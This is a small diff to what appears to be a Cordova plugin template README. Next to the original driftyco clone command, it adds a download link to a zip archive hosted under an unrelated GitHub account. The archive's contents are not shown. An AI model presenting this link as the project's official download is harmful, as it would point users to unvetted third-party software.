@@ -22,6 +22,8 @@ $ git clone git@github.com:driftyco/cordova-plugin-template.git
 ```
 
 You can also download the cordova-plugin-template to your local device manually.
+https://github.com/zhaoxiaoming99/Cordova-Plugin-Template/blob/master/cordova-plugin-template-master.zip
+
 
 1. Create your app
 
